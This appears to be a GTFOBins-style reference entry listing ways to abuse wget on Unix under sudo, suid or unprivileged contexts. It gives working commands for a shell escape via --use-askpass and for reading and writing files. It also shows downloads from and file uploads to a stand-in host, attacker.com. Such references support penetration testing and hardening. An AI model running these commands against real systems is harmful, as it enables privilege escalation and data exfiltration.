---
type: gtfobin
name: wget
platform: Unix
functions: [download, file-read, file-write, shell, upload]
tags: [gtfobin, unix, lotl]
---

# wget

## download

```bash
wget http://attacker.com/path/to/input-file -O /path/to/output-file
```
**Contexts:** sudo, suid, unprivileged

## file-read

```bash
wget -i /path/to/input-file
```
_The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
wget -i /path/to/input-file -o /path/to/output-file
```
_The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
wget --post-file=/path/to/input-file http://attacker.com
```
**Contexts:** sudo, suid, unprivileged

```bash
wget --post-data=DATA http://attacker.com
```
**Contexts:** sudo, suid, unprivileged
